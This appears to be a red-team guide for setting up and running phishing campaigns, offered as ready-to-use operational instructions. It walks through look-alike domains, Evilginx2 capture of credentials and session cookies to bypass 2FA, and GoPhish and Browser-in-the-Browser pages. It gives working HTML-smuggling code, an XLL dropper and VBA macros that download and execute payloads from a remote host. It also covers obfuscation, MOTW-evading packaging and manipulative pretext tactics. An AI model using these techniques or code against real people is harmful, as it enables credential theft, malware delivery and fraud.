# __Setup and conduct a phishing campaign__ 
>Author: Pieter Miske
---
### __Setup phishing infrastructure:__
#### _Domain name and credibility considerations:_
- Example domain name providers:
	- [AWS route 53](https://aws.amazon.com/route53/)
	- [namecheap](https://www.namecheap.com/)
- Use a domain name that closely mimics the domain name of the target organization or check for suitable [expired domain names](https://www.expireddomains.net/tld/net/) .
- Optionally use [accented ALT code letters](https://altcodeunicode.com/alt-codes-for-latin-letters-with-accents-or-diacritical-marks-used-in-foreign-languages/) to mimic already existing domains (e.g. use ę instead of e)  
- Check the credibility of your domain:     
    - [IBM X-Force Exchange](https://exchange.xforce.ibmcloud.com/url/nophish.link)
    - [Palo Alto Networks URL filtering](https://urlfiltering.paloaltonetworks.com/query/)
    - [Symantec Site Review](https://sitereview.bluecoat.com/#/)

#### _Setup AWS EC2 instance and mail server for phishing:_
- 1\. Configure the EC2 instance:
	- 1\. In AWS panelselect EC2
	- 2\. Select Ubuntu as the OS type (free tier)
	- 3\. Select the instance type t2.micro (free tier)
	- 4\. Create a new key pair (SSH) and carefully store the generated key!
	- 5\. Configure all the TCP and UTP ports that need to be accessible from the outsite (TCP:22:SSH, UDP:53:DNS, TCP:80:HTTP, TCP:443:HTTPS, TCP:3333:GoPhish, etc.) and set the 'Source type' to 'Anywhere'. 
	- 6\. If everything is correct, launch the new instance
- 2\. Connect to the EC2 instance (don't forget to give the SSH key correct permissions): `ssh -i <key.pem> ubuntu@<public IP address>`
- 3\. Install the following software on the EC2 instance:
	- [Go](https://go.dev/doc/install)
	- [Evilgnix2](https://github.com/kgretzky/evilginx2) as the MitM framework for credential gathering
	- [GoPhish](https://github.com/gophish/gophish) as the phishing management tool (also modify the 'config.json' file so the dashboard can be remotely reached)
	- Anything else that is required for your phishing attack. 
- 4\. Configure either [Mailgun](https://www.mailgun.com/) or [AWS SES]() as the mail servers (Mailgun is recommended but requires adding a credit card):
    - Mailgun:
    	- 1\. In the Mailgun dashboard, add your domain
    	- 2\. Add the TXT en CNAME records -generated by Mailgun- to the records list in AWS Route 53. Do this by creating multiple new records and selecting the correct 'Record type' (e.g. TXT, CNAME) and copy/paste the following data: 
    		- (Mailgun) Hostname (only the subdomain if applicable) > (AWS) 'Record name'
    		- (Mailgun) 'Enter This Value' > (AWS) 'Value'
    	- 3\. Now wait until the DNS records are updated and verify with: `dig <domain name> TXT`
	- AWS SES: for AWS SES you need to request production access to leave the sandbox environment otherwise you can't send emails' to unverified email addresses. 
- 5\. Configure the SMTP setting:
	- 1\. Generate the SMTP credentials for either AWS SES or Mailgun (depending on the configured mail server) and store them savely offline. 
	- 2\. Add the generated SMTP credentials to your phishing framework configuration (for GoPhish, check its [configuration section](https://github.com/pietermiske/RT-Survival-Guides/blob/main/Guides/Phishing.md/#Configure-and-start-a-phishing-campaign-using-Gophish)\).
- 6\. Add subdomains that fit the pretext or are required by the phishing framework (e.g. Evilginx2) in AWS Route 53. Create a base subdomain (e.g. microsoft.example.com) as an 'A' record using the IP address of the EC2 instance. If required add additional subdomains as 'CNAME' records (use the base subdomain as the routing domain). 

#### _Setup phishing infrastructure for payload hosting using the IPFS network:_
Free static landing page hosting solution that can serve client side payloads using the IPFS/IPNS network:
>Uploaded files to the IPFS network can never be 100% deleted due its distributed nature. 
- 1\. For first time usage, install and initialize IPFS \([go-ipfs](https://docs.ipfs.io/install/command-line/#official-distributions)\): `ipfs init`
- 2\. Start the IPFS daemon (go-ipfs): `ipfs daemon`
- 3\. Create a web root folder (e.g. web), add all the web files to this folder -including the payload- and add them to IPFS network  (go-ipfs): `ipfs add -r web`
- 4\. (optional) Publish the web content to IPNS network (this creates a static CID (aka Qm hash) that can be updated although in some casus the links still serve the old files)  (go-ipfs): `ipfs name publish <CID of the web folder>`
- 5\. Copy the created IPNS CID and cache it using the [Public Gateway Cacher](https://natoboram.gitlab.io/public-gateway-cacher/) tool so the network knows were to find the files. 
- 6\. It is now possible to use one of the URL's and remotely access the landing page (it can take up to 10 min before your content is accessible). 
- 7\. To update the content of the web root folder, simply change whatever you want in the 'web' folder and run step 3, 4 and 5 again

#### _Configure and capture credentials/cookies using Evilginx2:_
Evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
- 1\. Start the Evilginx2 server \([Evilginx2](https://github.com/kgretzky/evilginx2)\): `sudo ./bin/evilginx -p ./phishlets/`
- 2\. Enter the in AWS Route 53 configured domain (evilginx2): `config domain <example.com>`
- 3\. Enter the public IP address of the EC2 instance (evilginx2): `config ip <IP>`
- 4\. Configure a redirect URL for unauthorized connections (evilginx2): `config redirect_url <https://redirectURL.com>`
- 5\. Select a phishlet (aka template) and subdomain that fits the pretext (evilginx2): `phishlets hostname <phishlet (e.g. outlook)> <subdomain (e.g. microsoft.example.com)>`
- 6\. Check which subdomains are required by the phishlet (evilginx2): `phishlets get-hosts <phishlet (e.g. outlook)>`
- 7\. Create new DNS records for the required subdomains (e.g. in AWS Route 53).
- 8\. Enable the phishlet and get the SSL certificate (this will also show if any of the subdomains are not configured properly or are still not cached by DNS) (evilginx2): `phishlets enable <phishlet>`
- 9\. Start a lure/landing page (evilginx2): `lures create <phishlet>`
- 10\. Get the URL for the lure/landing page (evilginx2): `lures get-url <lure ID>`
- 11\. After sending the phishing link all interactions and captures are shown in the evilginx console. To check specific captured credentials and cookie tokens use: `sessions <session ID>`
- 12\. (optional) To get access to the browser session of the victim, go to the login panel of the corresponding website and copy/paste the captured cookie with CookieEditor (this will also bypass 2FA). 

#### _Configure and start a phishing campaign using Gophish:_
- 1\. In the EC2 instance install and run GoPhish \([Gophish](https://github.com/gophish/gophish)\): `./gophish`
- 2\. Configure 'Sending Profile' (SMTP configuration):
	- 1\. Create a new profile and set in the 'From' field the email address that you want to spoof
	- 2\. Add in the 'Host' field the mail server address (e.g. email-smtp.us-east-1.amazonaws.com:465)
	- 3\. Add both the SMTP username and password from your mail server. 
	- 4\. Send a test email to verify if everything is working properly
- 3\. Configure 'Users & Groups': add all the target email addresses to which the phish is going to be send. Use the CVS template if you want to add multiple email addresses (don't forget to delete the email address of the user you are impersonating).
- 4\. Configure 'Email Templates': create/add an email template that fits the pretext (don't forget to add the phishing link etc.)
- 5\. Configure 'Landing Pages': it is required to create a landing page even if you don't plan to use it. If you are going to use it, you can add or import your landing page here.  
- 6\. Configure 'Campaigns':
	- 1\. Select the correct 'Email Template', 'Landing Page', 'Sending Profile' and 'Groups'
	- 2\. Add as the URL the IP/DNS address of the EC2 instance were Gophish is running
	- 3\. Launch the campaign and send the phishing email to all the targets

#### _Setup easy to use credential phishing framework Zphisher:_
- Easy landing page setup for credentials gathering using either Cloudflares as its hosting platform or your own infra (for hosting on your own infra, edit the zphisher.sh script and change the HOST and PORT variables). This tool supports over 30 login templates like Microsoft, Google and Github \([zphisher](https://github.com/htr-tech/zphisher)\): `./zphisher.sh`

#### _Setup infra for Browser In The Browser (BITB) credential gathering attack:_
This attack method can trick users in entering their credentials by starting a legit looking but fake authentication pop-up screen and make it point to your own running phishing site. The original blog post can be found [here](https://mrd0x.com/browser-in-the-browser-phishing-attack/).
- 1\. Create/modify/start a landing page suitable for credential gathering (for example use [zphisher](https://github.com/htr-tech/zphisher)) and host it on your own infra. 
- 2\. Modify one of the [BITB](https://github.com/mrd0x/BITB) templates by editing the following placeholders:
    - XX-TITLE-XX: add a title for the BITB page (e.g. Sign in)
    - XX-DOMAIN-NAME-XX:  add the domain name you're masquerading (e.g. https://login.live.com)
    - XX-DOMAIN-PATH-XX: add the domain path you're masquerading (e.g. /login.srf?wa=wsignin1....)
    - XX-PHISHING-LINK-XX - add the link to your phishing site that is shown in the BITB page (e.g. http://phishing.com)
- 3\. Host the BITB web application files and use this URL in your phishing compaign. 

#### _Setup landing page for payload hosting using HTLM smuggling:_
HTML smuggling is an evasive malware delivery technique that leverages legitimate HTML5 and JavaScript features to drop malicious files on a target system\. When a victim clicks on a link that points to a malicious webpage leveraging HTML smuggling, the malicious file is served and downloaded to disk\. 
- 1\. Create a phishing/client payload and keep MOTW evasion in mind. 
- 2\. Create a convincing landing page (e.g. static HTML template) and add one of the following HTLM smuggling option to the page:
    - Base64 encoded payload in webpage that is downloaded on visiting the webpage (fast downloading speed but may look suspicious when inspecting the source code):
        ```html
        <html>
            <body>
                <script>
                    function base64ToArrayBuffer(base64)
                    {
                        var binary_string = window.atob(base64);
                        var len = binary_string.length;
                        var bytes = new Uint8Array( len );
                        for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                        return bytes.buffer;
                    }
                    var file ='<BASE64 ENCODED PAYLOAD STRING PLACEHOLDER>';
                    
                    var data = base64ToArrayBuffer(file);
                    var blob = new Blob([data], {type: 'octet/stream'});
                    
                    var fileName = '<GIVE THE FILE A NAME WITH EXTENTION>';
                    
                    var a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style = 'display: none';
                    var url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();
                    window.URL.revokeObjectURL(url);
                </script>
            </body>
        </html>
        ```
    - Serves stored payload in root directory that is downloaded on visiting the webpage (can be slow in downloading but visually better looking): 
        ```html
        <a href="#" id="download"></al>
          <script>
          var element = document.getElementById("download");
              element.href = "<FILE NAME THAT IS DOWNLOADED AND STORED IN ROOT DIR>";
          element.click();
          </script>
        ```
- 3\. Host the web application files on, for example, an EC2 instance or the IPFS network. 

#### _Leverage Swaks to send a quick internal phish from a terminal:_
- Send email with hyper\-link: \([swaks](https://github.com/jetmore/swaks)\): `swaks --from <fake sender email address> --to <target email address> --header 'Subject: <title of the mail>' --body email.body --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --server <IP mail server>`
- Send email with attachment: \(swaks\): `swaks --from <fake sender email address> --to <target email address> --header 'Subject: <title of the mail>' --body email.body (--attach <attachment file name>) --server <IP mail server>`
- Send email to multiple addresses  \(swaks\): `for email in $(cat <email_list.txt>); do swaks --from <confincing sender email> --to $email --header 'Subject: <email title>' --body email.body --server <fqdn or ip email server>; done`



---
### __Considerations for composing a phishing email:__
#### _Email and bypass spam filter considerations:_
- Check the credibility and spammyness of your emails:
    - [Mail tester](https://www.mail-tester.com/)
    - [Postmark spamcheck](https://spamcheck.postmarkapp.com/)
- Using a hyperlink that points to a remotely hosted payload instead of adding the payload as an attachment, will decrease the chance that the email is flagged by AV or marked as spam.
- Keep your email short and simple (max 3 sentinces).
- Don't reuse email templates from well known organisations like Microsoft.
- Don't overtest from your phishing domain or AWS (or whatever) can mark your domain as a spam domain.
- For phishing engagements, it's possible to let the target organisation whitelist your phishing domain so you don't have to deal with domain credebility issues. 

#### _Tips for writing a phishing email:_
- Context is importent: People respond well when an email matches the context of the mailbox it lands in\. That is, work\-related in the corporate mailbox, personal in the Gmail mailbox\. Emails in the work mailbox pretending to be from HR or IT have a significantly higher conversion rate than those pretending to be from another company the reader buys personal products from\. 
- Time matters: As studies by email marketing companies have shown, the time of day a recipient receives an email drastically affects the effectiveness of the email\. 8 am – 10 am and 3 pm – 4 pm is widely accepted as the most optimum times for the average person working a 9\-5 but work patterns at your company could skew this\. Find out what shifts people are working before you set the delivery schedule and adapt accordingly\. Make sure your phishing email is at the top of the reader’s mailbox when they open it to check emails\.
- Make it time critical: If you’re pushing a fake promotion with big discounts, make the offer expire in 4 hours or at midnight\. If you’re pretending to be someone’s boss, implicitly threaten them with a disciplinary if they don’t get it done on time\. The shorter the deadline the more effective it can be\. Self\-preservation \(keep reputation/salary\) trumps company preservation \(not getting hacked\) almost every time when people believe it’s real\. 
- Fake Authority: If you pretend to be a peer or a supplier you’ll have greater difficulty convincing someone to take action than if you pretend to be someone higher in their food chain\. Their boss, CEO, the police or government, etc\. are all common authority figures which can be used\.

#### _Make the phish more convincing:_
- If you need a realistic looking profile [picture](https://realbusinessmen.com/).
- Great collection of email [templates](https://reallygoodemails.com/).
- Obtaining the target organizations' mailing signature can make the phish more convincing. For example, to get the organizations' mailing signature, gather \+/\- 50/100 email addresses \(e\.g\. from LinkedIn\) and send them an email to which someone is likely to respond.  
- If possible, create your email with the same email client the target organization is using so you know how the email is visually presented to the victim.

#### _Email templates:_
- Example template 1: 
    ```html
    <html>
    <head>
    	<title></title>
    </head>
    <body>
    <p>
    Hi Alice,
    <br><br>
    Sorry to bother you at this hour, but it looks like someone is attempting to login to your account from a location in Russia. Can you login to the <a href="https://outlook.microsoft.example.com/RDACySrp">Microsoft O365 Dashboard</a> and check if you had any notifications that indicate suspicious activities?
    <br><br>
    Thanks in advance. 
    <br><br>
    John 
    </p>
    </body>
    </html>
    ```



---
### __Phishing payload development and packing:__
#### _XLL payload development:_
XLL's are DLL’s for Excel that look visually alot like normal XLS files. One disadvantage of XLL files is that they are architecture specific and therefore require you to know/guess which Office version the target is using (rule of thumb is that Office 2016 or earlier is x86 bit and Office 2019 or later is x64 bit). More info can be found in this [github repo](https://github.com/Octoberfest7/XLL_Phishing) and the example code below is from this [blog](https://redteamer.tips/a-pinch-of-xll-and-a-splash-of-rust-has-the-potential-to-be-a-sharp-combination/?utm_source=rss&utm_medium=rss&utm_campaign=a-pinch-of-xll-and-a-splash-of-rust-has-the-potential-to-be-a-sharp-combination).
>Like VBA macros, running the add-in XLL dropper will warn the user about the security risk which needs to be accepted for the code to be executed. 
- 1\. In visual studio start a class library project and modify the following C# example code:
    ```Csharp
    using System;
    using System.Diagnostics;
    using System.Net;
    
    namespace XLLtest
    {
        class Program
        {
            [DllExport]
            static void xlAutoOpen()
            {
                
                //EXAMPLE CODE
                string droplocation = Environment.GetEnvironmentVariable("LocalAppData") + "/Temp/test.exe";
                WebClient client = new WebClient();
                client.DownloadFile("http://10.10.10.10/test.exe", droplocation);
                Process.Start(droplocation);
    
            }
            static void Main(string[] args)
            {
    
            }
        }
    }
    ```
- 2\. Add the [DllExport](https://github.com/3F/DllExport) NuGet package to your project and configure the started 'DLLExport Manager' (or run the DLLExport.bat file if not auto started).
- 3\. Build the project and make sure the architecture of the .dll file is suitable for the target Excel version. 
- 4\. Change the extention of the compiled .dll to .xll. 
- 5\. Pack the .xll dropper (e.g. in an ISO, ZIP, etc.) to circumvent MOTW and deliver it to the target. 

#### _LNK file development:_
Windows shortcut (.LNK) files can be used to execute an arbitraty binary with arguments. Combining a .lnk file with a secondary attack vector that executes a payload, results in an effective phishing payload. 
- 1\. Create a malicious .lnk file by configuring the following options in the [SharpLNKGen-UI](https://github.com/jfmaes/SharpLNKGen-UI) tool (always select 'Export mode'):
	- 1\. Configure 'Target exe' option by specifying the binary that needs to be executed on dubbel clicking the .lnk file (this is almost always '%windir%\System32\cmd.exe')
	- 2\. Configure 'Icon' by specifying a path to a common location were an icon is stored (e.g. 'C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.EXE' or 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE') or download and select an [icon image](https://icon-icons.com/download/81551/ICO/512/) (this requires that the icon is shipped with the .lnk file to the target system and that you know the full path to this icon file). 
	- 3\. If an argument is required, select the 'Argument' option and enter the arguments (e.g. '/c start <payload.exe>')
	- 4\. Give it a discription fitting the type of "software" you are emulating (e.g. 'Microsoft Word' for a Word document)
	- 5\. Select the 'Bamboozle' option to prepend whitespaces so the 'Target' visually looks empty on inspecting
- 2\. Create/select the executable (dropper) that will run the actual payload and to which the .lnk file is pointing (e.g. a to DLL side-loading vulnerable application like OneDrive)
- 3\. Add the .lnk file, the dropper and the payload itself in a new folder. 
- 4\. [Pack the folder](https://github.com/pietermiske/RT-Survival-Guides/blob/main/Guides/Phishing.md/#Packing-phishing-payloads) (e.g. in an ISO, ZIP, etc.) to circumvent MOTW and deliver it to the target.

#### _DLL side-loading payload development:_
This technique can be used in a phishing attack in which a malicious .LNK file points to a DLL hijackable binary that will run a proxy DLL (all packed in a single container). 
- 1\. Select a DLL hijackable binary that is suitable as a phishing payload (e.g. OneDriveStandaloneUpdater.exe) and create a proxy DLL that is able to run shellcode from a encrypted file. Both can be found in this [section](https://github.com/pietermiske/RT-Survival-Guides/blob/main/Guides/Payload_development.md#Proxy-DLL-development-for-DLL-side-loading).
- 2\. [Create a .LNK file](https://github.com/pietermiske/RT-Survival-Guides/blob/main/Guides/Phishing.md/#LNK-file-development) that points to the DLL hijackable binary
- 3\. Pack the .LNK file, DLL hijackable binary, proxy DLL, original DLL and encrypted shellcode file in a single [ISO/IMG container](https://github.com/pietermiske/RT-Survival-Guides/blob/main/Guides/Phishing.md/#Packing-phishing-payloads) and hide all the files - with the exception of the .LNK file. 
- 4\. Ship the container to the target.

#### _VBA payload development:_
##### _Macro basics:_
- 1\. Create a new Excel or Word file and save it as type "Excel 97\-2003 Workbook” for Excel or “Word 97\-2003\-document \(\*\.doc\) for Word\. 
- 2\. In the document select "Macro's" in the "Developers" tab and in the Macro's drop down menu select "Macro's in" and select the name of the current file.
- 3\. Choose one of the following Macro execution options:
    - Auto execution: use "Sub AutoOpen\(\)" for Word and "Sub Auto\_Open\(\)" for Excel documents\. 
    - Button execution: add a button to the Excel/Word document and link it to the macro (OPSEC: this method tends to be better in evading AV) 
- 4\. Copy/paste and modify/combine one or more of the below VBA templates 
- 5\. Finally, right click on the Excel/Word document, go to "properties" > "Details" and select the option to delete all personal data in the file\. 

##### _Macro auto content switching technique:_
This trick can be used to change the showed content of the Word document the moment the victim clicks on the "enabled Macro's" button\.  
- 1\. Create a Word document that shows the title and maybe some basic info but gives the illusion that the real content is encrypted \(e\.g\. use RSA secured Logo, dummy RSa key, etc\.\)
- 2\. Create a second Word document that looks like the decrypted document
- 3\. With the decrypted text created, select all text and navigate to "Insert > Quick Parts > AutoTexts" and click "Save Selection to AutoText Gallery"\. In the "Create New Building Block" dialog box, enter the name "TheDoc":
- 4\. In the second document, delete the decypted text, copy the encypted looking text from the first created Word document and save it \(make sure it is Word 97\-2003\-document\)
- 5\. Add the following code as an Macro to switch from the encrypted looking file to the decrypted looking file the moment Macro's are enabled\. 
    ```VBS
    Sub Document_Open()
        SubstitutePage
    End Sub
    
    Sub AutoOpen()
        SubstitutePage
        <PAYLOAD PLACEHOLDER>
    End Sub
    
    Sub SubstitutePage()
        ActiveDocument.Content.Select
        Selection.Delete
        ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
    End Sub
    ```
- 6\. Also add macro code where the placeholder is located \(can be multiple lines\) that will download and execute a payload \(check the "Payload Development" section for options\)

##### _Macro example: VBA obfuscation via encryption and decryption technique:_
- 1\. Encrypt the command that downloads/executes a payload, the name of the Word document itself \(e\.g\. document\.doc\) and also any method names that most likely will be flagged \(in this example the method names are already encrypted\):
    ```VBS
    $payload = "<command, document or method name that needs to be encrypted>"
    [string]$output = ""
    $payload.ToCharArray() | %{
        [string]$thischar = [byte][char]$_ + 17
        if($thischar.Length -eq 1)
        {
            $thischar = [string]"00" + $thischar
            $output += $thischar
        }
        elseif($thischar.Length -eq 2)
        {
            $thischar = [string]"0" + $thischar
            $output += $thischar
        }
        elseif($thischar.Length -eq 3)
        {
            $output += $thischar
        }
    }
    $output | clip
    ```
- 2\. Create the following example Macro, add the obfuscated command  and document name, and rename the used variable names to something suitable \(the "Nuts\(\)" method will decrypt everything\):
    ```VBS
    Function Pears(Beets)
        Pears = Chr(Beets - 17)
    End Function
    
    Function Strawberries(Grapes)
        Strawberries = Left(Grapes, 3)
    End Function
    
    Function Almonds(Jelly)
        Almonds = Right(Jelly, Len(Jelly) - 3)
    End Function
    
    Function Nuts(Milk)
        Do
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        Milk = Almonds(Milk)
        Loop While Len(Milk) > 0
        Nuts = Oatmilk
    End Function
    
    Function MyMacro()
        Dim Apples As String
        Dim Water As String
        If ActiveDocument.Name <> Nuts("<encrypted name of the Word document.doc>") Then
        Exit Function
        End If
        Apples = "<encrypted command that will be executed>"
        Water = Nuts(Apples)
        GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create
        Water, Tea, Coffee, Napkin
    End Function
    
    Sub AutoOpen()
        MyMacro
    End Sub
    ```
 
##### _Macro example: breaks the WINWORD.EXE parent-child relationship:_
- Macro for Word document that breaks the WINWORD.EXE parent-child relationship, leverages the content switching trick and can download and execute a shell command:
    ```VBS
    Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
            Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
            ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
    Public Declare PtrSafe Sub Sleep Lib “kernel.32” (ByVal Milliseconds As LongPtr)
    
    Sub Document_Open()
        SubstitutePage
    End Sub
    
    Sub AutoOpen()
        SubstitutePage
        src = "http://192.168.1.10/payload.txt"
        dlpath = “C:\Windows\Temp\”
        URLDownloadToFile 0, src, dlpath & "payload.txt", 0, 0
        Dim proc As Object
        Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
        proc.Create "certutil -decode C:\Windows\Temp\payload.txt C:\Windows\Temp\payload.exe"
        Sleep 5000
        proc.Create “C:\Windows\Temp\payload.exe”
    End Sub
    
    Sub SubstitutePage()
        ActiveDocument.Content.Select
        Selection.Delete
        ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range,RichText:=True
    End Sub
    ```
##### _Macro example: Excel document using a button + msg box:_
- Macro for Excel document using a button + msg box to download and execute shell command:
    ```VBS
    Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
            Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
            ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
    Sub b()
    src = "http://10.111.10.5/payload.exe"
    dlpath = "C:\Users\Public\Libraries\"
    URLDownloadToFile 0, src, dlpath & "payload.exe", 0, 0
    Shell ("<COMMAND>")
    Var = InputBox("Enter Password: ", "CryptEx Security", 1)
    MsgBox "Incorrect password (Excel error code: 3)" & vbNewLine & vbNewLine & ""
    End Sub
    ```

##### _Macro example: Word document leveraging AutoRun:_
- Macro for Word document leveraging AutoRun and is able to download and execute shell command:
    ```VBS
    Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
            Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
            ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
            
    Sub AutoOpen()
    src = "http://10.111.10.5/payload.txt"
    dlpath = "C:\Users\Public\Libraries\"
    URLDownloadToFile 0, src, dlpath & "payload.txt", 0, 0
    Shell ("<COMMAND>")
    End Sub
    ```

#### _Packing phishing payloads:_
Packing the actual payload can increase the success rate of delivering the phish without getting flagged by file content scanners or having the Mark-Of-The-Web (MOTH) flag on the payload file(s). 
>Most discribed archiving/containering methods support 'MOTW strip', 'LOTL support' and 'execution without elevation'.  
- ISO + directory + hide \([PackMyPayload](https://github.com/mgeeky/PackMyPayload)\): `py PackMyPayload.py <folder to pack> <new file name>.iso -v (--hide <file1>,<file2>)`
- ZIP + directory (this works great for a XLL payload that is stored in the directory which is then archived): `zip -r <new file name>.zip <folder name>/`
- VHD/VHDX + single file (PackMyPayload): `py PackMyPayload.py <payload>.xll <new file name>.<vhd | vhdx> -v`
- IMG + directory + hide (some browsers will flag this immediately as a dangerous file extention) (PackMyPayload): `py PackMyPayload.py <folder to pack> <new file name>.img -v (--hide <file1>,<file2>)`





